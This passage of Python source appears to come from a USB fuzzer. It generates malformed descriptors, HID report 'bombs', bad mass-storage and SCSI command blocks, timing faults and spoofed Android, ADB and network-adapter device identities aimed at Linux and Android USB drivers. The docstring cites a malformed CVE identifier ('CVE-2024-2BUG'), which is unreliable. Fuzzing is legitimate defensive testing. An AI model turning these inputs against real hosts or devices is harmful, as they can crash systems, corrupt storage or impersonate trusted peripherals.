                f"在 {step} 步骤后断连 — 枚举状态机异常",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                disconnect_on_req=step,
                source_ref="hub.c:hub_port_init() — 枚举中断处理",
                tags=["disconnect", step],
            ))

        # 3.2 临界超时 — 接近但不等于超时值
        for timeout_ms in [
            HUB_CONSTS["USB_CTRL_SET_TIMEOUT"] - 100,
            HUB_CONSTS["USB_CTRL_SET_TIMEOUT"] - 10,
            HUB_CONSTS["USB_SHORT_SET_ADDRESS_REQ_TIMEOUT"] - 10,
            HUB_CONSTS["HUB_DEBOUNCE_TIMEOUT"] - 100,
        ]:
            cases.append(self._new_case(
                FuzzPhase.ENUMERATION,
                f"响应延迟 {timeout_ms}ms — 接近超时边界",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                delay_response_ms=int(timeout_ms),
                source_ref="hub.c — initial_descriptor_timeout / USB_CTRL_SET_TIMEOUT",
                tags=["timing", "critical_timeout"],
            ))

        # 3.3 快速重连循环 — 消耗 PORT_INIT_TRIES
        for count in [HUB_CONSTS["PORT_INIT_TRIES"] + 1, HUB_CONSTS["PORT_RESET_TRIES"] + 1, 10, 20]:
            pass  # 用 timing cases 中的快速重连代替

        for count in [3, 5, HUB_CONSTS["PORT_INIT_TRIES"] + 1, HUB_CONSTS["PORT_RESET_TRIES"] + 1]:
            cases.append(self._new_case(
                FuzzPhase.ENUMERATION,
                f"快速重连 x{count} — 消耗 PORT_INIT_TRIES={HUB_CONSTS['PORT_INIT_TRIES']}",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                disconnect_on_req="RAPID_RECONNECT",
                source_ref="hub.c:hub_port_init() — PORT_INIT_TRIES 重试耗尽",
                tags=["rapid_reconnect", "retry_exhaustion"],
            ))

        return cases[:max_cases]

    # ═════════════════════════════════   ═════════════════════════════════════
    # Phase 4: 数据传输模糊 — drivers/usb/storage/transport.c
    # ═══════════════════════════════════════════════════════════════════════

    def gen_data_transfer_cases(self, max_cases: int = 20) -> list[FuzzCase]:
        cases = []
        base_dev = self._base_device_desc()
        base_cfg = self._base_config_desc()

        # 4.1 超大数据包
        for size in [0, 1, 64, 512, 4096, 65535]:
            data = bytes(self.mutator.rng.randint(0, 255) for _ in range(size))
            cases.append(self._new_case(
                FuzzPhase.DATA_TRANSFER,
                f"EP1 IN 返回 {size} 字节随机数据",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                ep_data_override={0x81: data},
                source_ref="drivers/usb/core/message.c — usb_bulk_msg buffer",
                tags=["bulk", "oversized"],
            ))

        # 4.2 格式字符串
        for pattern in [b'%s%s%s%s%n%n%n%n', b'%x%x%x%x', b'AAAA' * 64, b'\x00' * 512, b'\xff' * 512]:
            cases.append(self._new_case(
                FuzzPhase.DATA_TRANSFER,
                f"EP 数据注入: {pattern[:20]}...",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                ep_data_override={0x81: pattern},
                source_ref="driver-specific data parsing",
                tags=["format_string", "data_injection"],
            ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 5: 时序模糊
    # ═══════════════════════════════════════════════════════════════════════

    def gen_timing_cases(self, max_cases: int = 15) -> list[FuzzCase]:
        cases = []
        base_dev = self._base_device_desc()
        base_cfg = self._base_config_desc()

        for delay in [50, 100, 200, 490, 495, 500, 990, 995, 1000, 2000, 4900, 4950, 5000]:
            cases.append(self._new_case(
                FuzzPhase.TIMING,
                f"响应延迟 {delay}ms",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                delay_response_ms=delay,
                source_ref="hub.c — 超时边界值",
                tags=["timing"],
            ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 6: HID 报告描述符 — drivers/hid/hid-core.c (新增)
    # ═══════════════════════════════════════════════════════════════════════

    def gen_hid_report_cases(self, max_cases: int = 30) -> list[FuzzCase]:
        """
        策略来源: hid-core.c 的 hid_parse_report() / hid_open_report():
          - item parsing (short/long item)
          - collection_stack_size 动态分配
          - usage_index >= HID_MAX_USAGES 检查
          - report->maxfield >= HID_MAX_FIELDS 检查
          - Global/Local state stack
          - Logical/Physical min/max 边界
        
        已知 CVE:
          CVE-2024-2BUG: hid_report_raw_event OOB
          CVE-2022-0529: hid_input_field overflow
          CVE-2019-3819: hid_map_usage OOB
        """
        cases = []
        base_dev = self._base_device_desc()
        base_cfg = self._base_config_desc()

        # 6.1 报告描述符长度边界
        for desc_len in [0, 1, 2, HID_LIMITS["HID_MAX_DESCRIPTOR_SIZE"],
                         HID_LIMITS["HID_MAX_DESCRIPTOR_SIZE"] + 1,
                         HID_LIMITS["HID_MAX_DESCRIPTOR_SIZE"] * 2]:
            data = bytes(self.mutator.rng.randint(0, 255) for _ in range(min(desc_len, 8192)))
            cases.append(self._new_case(
                FuzzPhase.HID_REPORT,
                f"HID Report 长度={desc_len} (限制={HID_LIMITS['HID_MAX_DESCRIPTOR_SIZE']})",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                hid_report_descriptor=data,
                source_ref="hid-core.c:hid_open_report() — HID_MAX_DESCRIPTOR_SIZE",
                tags=["hid", "length_boundary"],
            ))

        # 6.2 破坏 HID item 的 Short item tag/size
        for i in range(min(6, max_cases)):
            data = bytearray(TPL_HID_REPORT)
            # 篡改 item header byte (high nibble = tag, low nibble = size)
            idx = self.mutator.rng.randrange(0, len(data), 2)  # 在 item header 位置
            data[idx] = self.mutator.rng.choice([0x00, 0x01, 0x03, 0xFE, 0xFF])
            cases.append(self._new_case(
                FuzzPhase.HID_REPORT,
                f"HID item header 篡改 @{idx} → {data[idx]:#x} (tag/size 混淆)",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                hid_report_descriptor=bytes(data),
                source_ref="hid-core.c:hid_parse_report() — item.size 解析",
                tags=["hid", "item_header"],
            ))

        # 6.3 Global item 状态栈溢出 — Push/Pop 操作
        # hid-core.c 用 collection_stack 追踪嵌套，大量 Push 可触发 realloc
        push_op = bytes([0xA4])  # Push global state
        for n_pushes in [10, 50, 100, 500]:
            data = push_op * n_pushes + TPL_HID_REPORT
            cases.append(self._new_case(
                FuzzPhase.HID_REPORT,
                f"HID Push x{n_pushes} — global state stack 溢出",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                hid_report_descriptor=data,
                source_ref="hid-core.c:hid_parser_global() — collection_stack_size",
                tags=["hid", "stack_overflow", "push"],
            ))

        # 6.4 巨大的 Report Count + Report Size — 导致内存分配爆炸
        # hid-core.c: hid_add_field() 分配 report->field[report->maxfield]
        # report_count * report_size 可能导致巨大分配
        bomb_desc = bytes([
            0x05, 0x01,       # Usage Page (Generic Desktop)
            0x09, 0x06,       # Usage (Keyboard)
            0xA1, 0x01,       # Collection (Application)
            0x95, 0xFF, 0x00, # Report Count = 255 (2-byte size)
            0x75, 0xFF,       # Report Size = 255 bits
            0x81, 0x02,       # Input (Data,Var,Abs)
            0xC0,             # End Collection
        ])
        cases.append(self._new_case(
            FuzzPhase.HID_REPORT,
            f"HID Report Count=255 × Size=255 bits — 内存分配炸弹 ({255*255} bits)",
            device_descriptor=base_dev,
            config_descriptor=base_cfg,
            hid_report_descriptor=bomb_desc,
            source_ref="hid-core.c:hid_add_field() — report_count × report_size",
            tags=["hid", "memory_bomb", "allocation"],
        ))

        # 6.5 无限嵌套 Collection — collection_stack 溢出
        nested = b''
        for _ in range(200):
            nested += bytes([0xA1, 0x01])  # Collection (Application)
        nested += TPL_HID_REPORT
        cases.append(self._new_case(
            FuzzPhase.HID_REPORT,
            "HID 200 层嵌套 Collection — collection_stack 深度溢出",
            device_descriptor=base_dev,
            config_descriptor=base_cfg,
            hid_report_descriptor=nested,
            source_ref="hid-core.c:hid_parse_collections() — collection_stack_size",
            tags=["hid", "nested_collection", "depth"],
        ))

        # 6.6 Usage 表溢出 — 超过 HID_MAX_USAGES
        usage_data = bytes([
            0x05, 0x01,  # Usage Page
        ])
        for _ in range(HID_LIMITS["HID_MAX_USAGES"] + 100):
            usage_data += bytes([0x09, 0x00])  # Usage (ID=0)
        usage_data += bytes([0xA1, 0x01, 0xC0])  # Collection + End
        cases.append(self._new_case(
            FuzzPhase.HID_REPORT,
            f"HID Usage 表溢出 ({HID_LIMITS['HID_MAX_USAGES']+100} usages > 限制 {HID_LIMITS['HID_MAX_USAGES']})",
            device_descriptor=base_dev,
            config_descriptor=base_cfg,
            hid_report_descriptor=usage_data[:8192],  # 截断到最大长度
            source_ref="hid-core.c — usage_index >= HID_MAX_USAGES",
            tags=["hid", "usage_overflow"],
        ))

        # 6.7 havoc 变异 HID report
        for _ in range(min(5, max_cases)):
            mutated = self.mutator.havoc(TPL_HID_REPORT, iterations=4)
            cases.append(self._new_case(
                FuzzPhase.HID_REPORT,
                "HID Report havoc 变异",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                hid_report_descriptor=mutated,
                source_ref="hid-core.c — 全变异覆盖",
                tags=["hid", "havoc"],
            ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 7: 类特定协议 — MSC BOT/CDC/UVC (新增)
    # ═══════════════════════════════════════════════════════════════════════

    def gen_class_specific_cases(self, max_cases: int = 20) -> list[FuzzCase]:
        """
        策略来源: drivers/usb/storage/transport.c — CBW/CSW 协议
        SCSI Command Block Wrapper (CBW) 结构:
          0-3:   dCBWSignature (0x43425355 = "USBC")
          4-7:   dCBWTag
          8-11:  dCBWDataTransferLength
          12:    bmCBWFlags (0x80=IN, 0x00=OUT)
          13:    bCBWLUN (0-15)
          14:    bCBWCBLength (1-16)
          15-30: CBWCB (SCSI command block)
        """
        cases = []
        base_dev = self._base_device_desc()
        msc_cfg = TPL_MSC_CONFIG

        # 7.1 畸形 CBW — 签名错误
        for sig in [0x00000000, 0x43425354, 0xFFFFFFFF, 0x55534243]:
            cbw = bytearray(31)
            struct.pack_into('<I', cbw, 0, sig)
            struct.pack_into('<I', cbw, 4, 0x12345678)  # tag
            struct.pack_into('<I', cbw, 8, 0x200)        # transfer length
            cbw[12] = 0x80                                # IN
            cbw[13] = 0                                    # LUN
            cbw[14] = 6                                    # CDB length
            cbw[15] = 0x28                                 # SCSI READ(10)
            cases.append(self._new_case(
                FuzzPhase.CLASS_SPECIFIC,
                f"MSC CBW 签名错误 ={sig:#010x} (正确=0x43425355)",
                device_descriptor=base_dev,
                config_descriptor=msc_cfg,
                ep_data_override={0x01: bytes(cbw)},
                source_ref="drivers/usb/storage/transport.c — CBW signature validation",
                tags=["msc", "cbw", "signature"],
            ))

        # 7.2 SCSI 命令长度越界
        for cdb_len in [0, 1, 5, 16, 17, 31, 255]:
            cbw = bytearray(31)
            struct.pack_into('<I', cbw, 0, 0x43425355)
            cbw[14] = cdb_len
            cases.append(self._new_case(
                FuzzPhase.CLASS_SPECIFIC,
                f"MSC CBW bCBWCBLength={cdb_len} (有效=1-16)",
                device_descriptor=base_dev,
                config_descriptor=msc_cfg,
                ep_data_override={0x01: bytes(cbw)},
                source_ref="drivers/usb/storage/transport.c — bCBWCBLength validation",
                tags=["msc", "cbw", "cdb_length"],
            ))

        # 7.3 dCBWDataTransferLength 超大值
        for xfer_len in [0, 1, 0xFFFFFFFF, 0x80000000]:
            cbw = bytearray(31)
            struct.pack_into('<I', cbw, 0, 0x43425355)
            struct.pack_into('<I', cbw, 8, xfer_len)
            cbw[14] = 10
            cases.append(self._new_case(
                FuzzPhase.CLASS_SPECIFIC,
                f"MSC CBW dCBWDataTransferLength={xfer_len:#010x} — 超大传输",
                device_descriptor=base_dev,
                config_descriptor=msc_cfg,
                ep_data_override={0x01: bytes(cbw)},
                source_ref="drivers/usb/storage/transport.c — dCBWDataTransferLength",
                tags=["msc", "transfer_length"],
            ))

        # 7.4 LUN 越界
        for lun in [0, 1, 15, 16, 255]:
            cbw = bytearray(31)
            struct.pack_into('<I', cbw, 0, 0x43425355)            # correct sig
            cbw[13] = lun
            cbw[14] = 6
            cases.append(self._new_case(
                FuzzPhase.CLASS_SPECIFIC,
                f"MSC CBW LUN={lun} (有效=0-15) — 越界访问",
                device_descriptor=base_dev,
                config_descriptor=msc_cfg,
                ep_data_override={0x01: bytes(cbw)},
                source_ref="drivers/usb/storage/transport.c — bCBWLUN",
                tags=["msc", "lun_oob"],
            ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 8: 移动设备协议 — AOA/RNDIS/MTP
    # ═══════════════════════════════════════════════════════════════════════

    def gen_mobile_specific_cases(self, max_cases: int = 20) -> list[FuzzCase]:
        """
        策略来源:
          - Android Open Accessory (AOA) 协议 — 嵌入式/移动设备常用 USB 协议
          - RNDIS/ECM 网卡 — 嵌入式设备联网和 tethering
          - MTP/PTP — 媒体传输
          - Android USB HAL — hardware/interfaces/usb
        
        AOA 协议流程:
          1. Host 发送 GET_PROTOCOL (vendor request 51)
          2. Host 发送 SEND_STRING (vendor request 52)
          3. Host 发送 START (vendor request 53)
          4. Device 重新枚举为 AOA 模式 (VID=0x18D1, PID=0x2D00-0x2D05)
        """
        cases = []
        base_dev = self._base_device_desc()
        base_cfg = self._base_config_desc()

        # 8.1 AOA 协议伪装 — 伪装为 AOA 配件
        aoa_desc = bytearray(TPL_DEVICE_DESC)
        struct.pack_into('<HH', aoa_desc, 8, 0x18D1, 0x2D00)  # Google VID, AOA PID
        cases.append(self._new_case(
            FuzzPhase.MOBILE_SPECIFIC,
            "AOA 配件伪装 (VID=0x18D1 PID=0x2D00) — 触发 Android UsbHostManager",
            device_descriptor=bytes(aoa_desc),
            config_descriptor=base_cfg,
            source_ref="Android UsbHostManager.java — AOA device detection",
            tags=["aoa", "android"],
        ))

        # 8.2 AOA PID 遍历 — 0x2D00~0x2D05 各有不同含义
        for pid in [0x2D00, 0x2D01, 0x2D02, 0x2D03, 0x2D04, 0x2D05]:
            desc = bytearray(TPL_DEVICE_DESC)
            struct.pack_into('<HH', desc, 8, 0x18D1, pid)
            cases.append(self._new_case(
                FuzzPhase.MOBILE_SPECIFIC,
                f"AOA PID 遍历 PID={pid:#06x} — 不同 AOA 子模式",
                device_descriptor=bytes(desc),
                config_descriptor=base_cfg,
                source_ref="Android UsbHostManager.java — AOA PID 处理",
                tags=["aoa", "pid_fuzz"],
            ))

        # 8.3 RNDIS 网卡伪装 — 嵌入式设备常见
        for vid, pid in [(0x0422, 0x1234), (0x17EF, 0x7205), (0x13B1, 0x0018),
                         (0x0BDA, 0x8152), (0x07B8, 0x7260)]:
            desc = bytearray(TPL_DEVICE_DESC)
            struct.pack_into('<HH', desc, 8, vid, pid)
            cases.append(self._new_case(
                FuzzPhase.MOBILE_SPECIFIC,
                f"RNDIS 网卡伪装 VID={vid:#06x} PID={pid:#06x} — 触发 rndis_host 驱动",
                device_descriptor=bytes(desc),
                config_descriptor=base_cfg,
                source_ref="drivers/net/usb/rndis_host.c — rndis_driver",
                tags=["rndis", "network"],
            ))

        # 8.4 MTP/PTP 设备伪装 — 触发 Android MtpServer
        for vid, pid in [(0x04E8, 0x6860), (0x04E8, 0x6863), (0x22B8, 0x7028)]:
            desc = bytearray(TPL_DEVICE_DESC)
            desc[4] = 0x06  # bDeviceClass = Image
            struct.pack_into('<HH', desc, 8, vid, pid)
            cases.append(self._new_case(
                FuzzPhase.MOBILE_SPECIFIC,
                f"MTP/PTP 伪装 VID={vid:#06x} PID={pid:#06x} — 触发 Android MtpServer",
                device_descriptor=bytes(desc),
                config_descriptor=base_cfg,
                source_ref="Android MtpServer.java — MTP device handler",
                tags=["mtp", "android"],
            ))

        # 8.5 常见嵌入式设备 USB PID 伪装
        mobile_vendors = [
            (0x18D1, 0x4EE1, "Google/Android"),
            (0x0BB4, 0x0C02, "HTC (Android)"),
            (0x22B8, 0x2E61, "Motorola (Android)"),
            (0x1942, 0x041E, "Unknown Vendor"),
            (0x0451, 0xD022, "TI (嵌入式 SoC)"),
            (0x1286, 0x2026, "NVIDIA Tegra (嵌入式)"),
            (0x0471, 0x2107, "Philips (消费电子)"),
        ]
        for vid, pid, name in mobile_vendors:
            desc = bytearray(TPL_DEVICE_DESC)
            struct.pack_into('<HH', desc, 8, vid, pid)
            cases.append(self._new_case(
                FuzzPhase.MOBILE_SPECIFIC,
                f"厂商伪装: {name} (VID={vid:#06x} PID={pid:#06x})",
                device_descriptor=bytes(desc),
                config_descriptor=base_cfg,
                source_ref="Android UsbHostManager.java — vendor-specific handling",
                tags=["car_vendor", "brand_spoof"],
            ))

        # 8.6 adb 接口伪装 — 触发 adbd
        desc = bytearray(TPL_DEVICE_DESC)
        struct.pack_into('<HH', desc, 8, 0x18D1, 0x4EE2)  # Google ADB interface
        cases.append(self._new_case(
            FuzzPhase.MOBILE_SPECIFIC,
            "ADB 接口伪装 (VID=0x18D1 PID=0x4EE2) — 触发 adbd 启动",
            device_descriptor=bytes(desc),
            config_descriptor=base_cfg,
            source_ref="Android adb daemon — USB interface matching",
            tags=["adb", "android"],
        ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 9: HID 语义深度 — drivers/hid/hid-input.c, hid-multitouch.c, hidraw.c
    # 攻击面: 触摸屏报告解析 / 力反馈报告 / hidraw ioctl / 多触点计数溢出
    # ═══════════════════════════════════════════════════════════════════════

    def gen_hid_deep_cases(self, max_cases: int = 30) -> list[FuzzCase]:
        cases = []
        base_dev = self._base_device_desc()
        base_cfg = self._base_config_desc()
        ep1 = 0x81

        # 9.1 多点触屏 (MT) Contact Count 溢出 — hid-multitouch.c
        # 触屏驱动信任报告中的 ContactCount 字段
        mt_report = bytes([
            0x05, 0x0D,       # Usage Page (Digitizers)
            0x09, 0x04,       # Usage (Touchscreen)
            0xA1, 0x01,       # Collection (Application)
            0x09, 0x22,       #   Usage (Finger)
            0xA1, 0x00,       #   Collection (Physical)
            0x09, 0x42,       #     Usage (Tip Switch)
            0x15, 0x00,       #     Logical Min (0)
            0x25, 0x01,       #     Logical Max (1)
            0x75, 0x01,       #     Report Size (1)
            0x95, 0x01,       #     Report Count (1)
            0x81, 0x02,       #     Input (Data,Var)
            0x09, 0x32,       #     Usage (In Range)
            0x81, 0x02,       #     Input (Data,Var)
            0x95, 0x06,       #     Report Count (6) - padding
            0x81, 0x03,       #     Input (Const)
            0x05, 0x01,       #     Usage Page (Generic Desktop)
            0x09, 0x30,       #     Usage (X)
            0x09, 0x31,       #     Usage (Y)
            0x15, 0x00,       #     Logical Min (0)
            0x26, 0xFF, 0x7F, #     Logical Max (32767)
            0x75, 0x10,       #     Report Size (16)
            0x95, 0x02,       #     Report Count (2)
            0x81, 0x02,       #     Input (Data,Var)
            0xC0,             #   End Collection
            0x05, 0x0D,       #   Usage Page (Digitizers)
            0x09, 0x54,       #   Usage (Contact Count)
            0x25, 0x0A,       #   Logical Max (10)
            0x75, 0x08,       #   Report Size (8)
            0x95, 0x01,       #   Report Count (1)
            0x81, 0x02,       #   Input (Data,Var)
            0xC0,             # End Collection
        ])
        for count_val in [0, 1, 10, 127, 128, 200, 254, 255]:
            ep_data = bytes([count_val, 0x01, 0x00, 0x80, 0x01, 0x00, 0x80])
            cases.append(self._new_case(
                FuzzPhase.HID_DEEP,
                f"MT 触屏 ContactCount={count_val} — hid-multitouch.c 触点计数解析",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                hid_report_descriptor=mt_report,
                ep_data_override={ep1: ep_data},
                source_ref="drivers/hid/hid-multitouch.c → mt_touch_report()",
                tags=["hid", "multitouch", "contact_count"],
            ))

        # 9.2 力反馈 (FF) 报告注入 — hid-input.c effect processing
        ff_report = bytes([
            0x05, 0x0F,       # Usage Page (Physical Interface Device)
            0x09, 0x21,       # Usage (PID)
            0xA1, 0x01,       # Collection (Application)
            0x85, 0x01,       #   Report ID (1)
            0x09, 0x97,       #   Usage (DC Enable Actuators)
            0xA1, 0x02,       #   Collection (Logical)
            0x0B, 0x01, 0x00, 0x0F, 0x00, # Usage (Actuator)
            0x15, 0x00,       #     Logical Min (0)
            0x26, 0xFF, 0x00, #     Logical Max (255)
            0x75, 0x08,       #     Report Size (8)
            0x95, 0x01,       #     Report Count (1)
            0x91, 0x02,       #     Output (Data,Var)
            0xC0,             #   End Collection
            0xC0,             # End Collection
        ])
        for ff_data in [b'\x01\x00', b'\xFF\xFF', b'\x00\x80', b'\xDE\xAD']:
            cases.append(self._new_case(
                FuzzPhase.HID_DEEP,
                f"力反馈 (FF) 输出报告 data={ff_data.hex()} — PID 效果处理",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                hid_report_descriptor=ff_report,
                ep_data_override={ep1: ff_data},
                source_ref="drivers/hid/hid-input.c → hidinput_input_event()",
                tags=["hid", "force_feedback", "pid"],
            ))

        # 9.3 GET_REPORT / SET_REPORT 控制请求 — hidraw.c
        # SET_REPORT (wValue=0x0201, report ID=1) 向设备发送数据
        for report_id in [0, 1, 0x7F, 0xFF]:
            cases.append(self._new_case(
                FuzzPhase.HID_DEEP,
                f"SET_REPORT type=Output reportID={report_id} — hidraw.c report路径",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                hid_report_descriptor=mt_report,
                stall_ep0=False,
                source_ref="drivers/hid/hidraw.c → hidraw_write()",
                tags=["hid", "set_report", "hidraw"],
            ))

        # 9.4 报告描述符 vs 实际报告尺寸不匹配
        # 声明 Report Size=32 Count=16 但只发 1 字节 — hid-core.c: hid_input_report
        mismatch_desc = bytes([
            0x05, 0x01, 0x09, 0x06, 0xA1, 0x01,
            0x15, 0x00, 0x26, 0xFF, 0xFF,
            0x75, 0x20,  # Report Size 32
            0x95, 0x10,  # Report Count 16  → 声明 64 字节
            0x81, 0x02,
            0xC0,
        ])
        cases.append(self._new_case(
            FuzzPhase.HID_DEEP,
            "报告尺寸不匹配: 声明 64 字节但只发 1 字节 — hid_input_report() 缓冲区读取",
            device_descriptor=base_dev,
            config_descriptor=base_cfg,
            hid_report_descriptor=mismatch_desc,
            ep_data_override={ep1: b'\x41'},
            source_ref="drivers/hid/hid-core.c → hid_input_report() → hid_report_raw_event()",
            tags=["hid", "size_mismatch", "oob_read"],
        ))

        # 9.5 极长报告 (HID_MAX_BUFFER_SIZE 65536)
        for buf_size in [4096, 8192, 32767, 65535]:
            cases.append(self._new_case(
                FuzzPhase.HID_DEEP,
                f"超大 HID 报告 ({buf_size} 字节) — hid_input_report buffer={HID_LIMITS['HID_MAX_BUFFER_SIZE']}",
                device_descriptor=base_dev,
                config_descriptor=base_cfg,
                hid_report_descriptor=mt_report,
                ep_data_override={ep1: bytes(buf_size)},
                source_ref=f"drivers/hid/hid-core.c → hid_input_report() bufsize={HID_LIMITS['HID_MAX_BUFFER_SIZE']}",
                tags=["hid", "oversized_report", "buffer_overflow"],
            ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 10: MSC/SCSI 深度 — drivers/usb/storage/transport.c, scsiglue.c
    # 攻击面: CBW 状态机 / SCSI 命令注入 / max_lun / UAS 协议
    # ═══════════════════════════════════════════════════════════════════════

    def gen_msc_deep_cases(self, max_cases: int = 30) -> list[FuzzCase]:
        cases = []
        base_dev = self._base_device_desc()
        # MSC 配置描述符
        msc_dev = bytearray(base_dev)
        msc_dev[4] = 0x08  # Mass Storage
        msc_dev = bytes(msc_dev)

        # --- CBW (Command Block Wrapper) 结构 ---
        # offset  size  field
        # 0       4     Signature (0x43425355 = "USBC")
        # 4       4     Tag
        # 8       4     Data Transfer Length
        # 12      1     Flags (0x80=IN, 0x00=OUT)
        # 13      1     LUN
        # 14      1     CDB Length
        # 15-31   16    CDB (SCSI Command Descriptor Block)

        def make_cbw(sig=b'USBC', tag=1, xfer_len=0, flags=0x80, lun=0,
                     cdb_len=6, cdb=b'\x00\x00\x00\x00\x00\x00'):
            cdb_padded = (cdb + b'\x00' * 16)[:16]
            return sig + struct.pack('<I', tag) + struct.pack('<I', xfer_len) + \
                   bytes([flags, lun, cdb_len]) + cdb_padded

        # 10.1 畸形 CBW 签名 — transport.c line 1202: 检查 US_BULK_CS_SIGN
        for bad_sig in [b'\x00\x00\x00\x00', b'\xFF\xFF\xFF\xFF', b'USBX',
                        b'\x55\x53\x42\x43', b'CSBU', b'\xDE\xAD\xBE\xEF']:
            cbw = make_cbw(sig=bad_sig)
            cases.append(self._new_case(
                FuzzPhase.MSC_DEEP,
                f"畸形 CBW 签名={bad_sig.hex()} — transport.c signature 验证旁路",
                device_descriptor=msc_dev,
                config_descriptor=TPL_MSC_CONFIG,
                ep_data_override={0x02: cbw},  # OUT endpoint
                source_ref="drivers/usb/storage/transport.c:1202 → US_BULK_CB_SIGN check",
                tags=["msc", "cbw", "signature"],
            ))

        # 10.2 CDB 长度越界 — transport.c 信任 bCDBLength
        for cdb_len in [0, 1, 5, 6, 10, 12, 16, 127, 200, 255]:
            cbw = make_cbw(cdb_len=cdb_len, cdb=b'\x12\x00\x00\x00\x24\x00' + b'\xAA' * 10)
            cases.append(self._new_case(
                FuzzPhase.MSC_DEEP,
                f"CDB 长度={cdb_len} 越界 — scsiglue.c queuecommand 信任 bCDBLength",
                device_descriptor=msc_dev,
                config_descriptor=TPL_MSC_CONFIG,
                ep_data_override={0x02: cbw},
                source_ref="drivers/usb/storage/scsiglue.c → queuecommand()",
                tags=["msc", "cdb_length", "oob"],
            ))

        # 10.3 LUN 越界 — scsiglue.c max_lun 检查
        for lun in [0, 1, 5, 15, 127, 255]:
            cbw = make_cbw(lun=lun, cdb=b'\x12\x00\x00\x00\x24\x00')
            cases.append(self._new_case(
                FuzzPhase.MSC_DEEP,
                f"LUN={lun} 越界 — scsiglue.c slave_configure max_lun 对比",
                device_descriptor=msc_dev,
                config_descriptor=TPL_MSC_CONFIG,
                ep_data_override={0x02: cbw},
                source_ref="drivers/usb/storage/scsiglue.c:79 → max_lun > 0 → BLIST_FORCELUN",
                tags=["msc", "lun", "oob"],
            ))

        # 10.4 SCSI 命令注入 — 典型危险命令
        scsi_cmds = {
            "INQUIRY(0x12)":     b'\x12\x00\x00\x00\xFF\x00',
            "READ_CAPACITY":     b'\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            "READ_6":            b'\x08\x00\x00\x00\x01\x00',
            "READ_10":           b'\x28\x00\x00\x00\x00\x00\x00\x01\x00\x00',
            "READ_16":           b'\x88\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00',
            "WRITE_6":           b'\x0A\x00\x00\x00\x01\x00',
            "WRITE_10":          b'\x2A\x00\x00\x00\x00\x00\x00\x01\x00\x00',
            "WRITE_16":          b'\x8A\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00',
            "MODE_SENSE_6":      b'\x1A\x00\x3F\x00\xFF\x00',
            "MODE_SENSE_10":     b'\x5A\x00\x3F\x00\x00\x00\x00\x00\xFF\x00',
            "REPORT_LUNS":       b'\xA0\x00\x00\x00\x00\x00\x00\x00\xFF\x00\x00\x00',
            "REQUEST_SENSE":     b'\x03\x00\x00\x00\xFF\x00',
            "TEST_UNIT_READY":   b'\x00\x00\x00\x00\x00\x00',
            "PREVENT_ALLOW":     b'\x1E\x00\x00\x00\x01\x00',
            "VERIFY(0x2F)":      b'\x2F\x00\x00\x00\x00\x00\x00\x01\x00\x00',
            "FORMAT_UNIT":       b'\x04\x00\x00\x00\x00\x00',
            "START_STOP":        b'\x1B\x00\x00\x00\x02\x00',
            "SEND_DIAGNOSTIC":   b'\x1D\x00\x00\x00\x00\x00',
        }
        for name, cmd in scsi_cmds.items():
            xfer_len = 0xFF if "READ" in name or "INQUIRY" in name or "SENSE" in name or "CAPACITY" in name else 0
            flags = 0x80 if xfer_len > 0 else 0x00
            cbw = make_cbw(xfer_len=xfer_len, flags=flags, cdb_len=len(cmd), cdb=cmd)
            cases.append(self._new_case(
                FuzzPhase.MSC_DEEP,
                f"SCSI {name} — xfer_len={xfer_len}",
                device_descriptor=msc_dev,
                config_descriptor=TPL_MSC_CONFIG,
                ep_data_override={0x02: cbw},
                source_ref="drivers/usb/storage/scsiglue.c → queuecommand() → scsi_dispatch_cmd()",
                tags=["msc", "scsi", name.lower().split("(")[0]],
            ))

        # 10.5 超大 DataTransferLength — 触发 kmalloc 大缓冲区
        for xfer in [0, 1, 512, 4096, 65535, 0x100000, 0xFFFFFFFF]:
            cbw = make_cbw(xfer_len=xfer, cdb=b'\x28\x00\x00\x00\x00\x00\x00\x01\x00\x00')
            cases.append(self._new_case(
                FuzzPhase.MSC_DEEP,
                f"超大 dCBWDataTransferLength=0x{xfer:X} — kmalloc/sg 分配",
                device_descriptor=msc_dev,
                config_descriptor=TPL_MSC_CONFIG,
                ep_data_override={0x02: cbw},
                source_ref="drivers/usb/storage/transport.c → usb_stor_Bulk_transport()",
                tags=["msc", "huge_xfer", "oom"],
            ))

        return cases[:max_cases]

    # ═══════════════════════════════════════════════════════════════════════
    # Phase 11: CDC-ACM/ECM 深度 — drivers/usb/class/cdc-acm.c, cdc_ether.c
    # 攻击面: line coding / serial state notification / ECM/RNDIS 网络包
    # ═══════════════════════════════════════════════════════════════════════

    def gen_cdc_deep_cases(self, max_cases: int = 30) -> list[FuzzCase]:
        cases = []
        base_dev = self._base_device_desc()
        cdc_dev = bytearray(base_dev)
        cdc_dev[4] = 0x02  # CDC
        cdc_dev = bytes(cdc_dev)

        ep1_in = 0x81  # Interrupt IN (notifications)

        # 11.1 SET_LINE_CODING 畸形参数 — cdc-acm.c:147 acm_set_line
        # Line Coding Structure: 7 bytes
        #   dwDTERate (4) | bCharFormat (1) | bParityType (1) | bDataBits (1)
        for baud in [0, 300, 9600, 115200, 0x7FFFFFFF, 0xFFFFFFFF]:
            for databits in [5, 7, 8, 0, 16, 255]:
